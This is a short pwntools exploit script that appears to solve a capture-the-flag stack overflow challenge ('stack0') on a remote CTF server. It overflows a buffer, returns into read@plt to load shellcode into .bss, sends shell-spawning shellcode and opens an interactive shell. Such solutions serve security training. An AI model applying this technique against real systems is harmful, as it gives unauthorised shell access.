from pwn import *

def main():
    context(arch="i386",os="linux")
    #r = process("./stack0")
    r = remote("ctf.hackucf.org",32101)
    read_plt = 0x8048510
    bss = 0x08049bdc

    sh = asm(shellcraft.sh())


    p = ""
    p += "A" * 63
    p += p32(read_plt)
    p += p32(bss) # after read
    p += p32(0) # input
    p += p32(bss) # read to bsss
    p += p32(0xffffffff) # very big size to read

    r.sendline(p)
    r.sendline(sh)
    r.interactive()



if __name__ == "__main__":
    main()
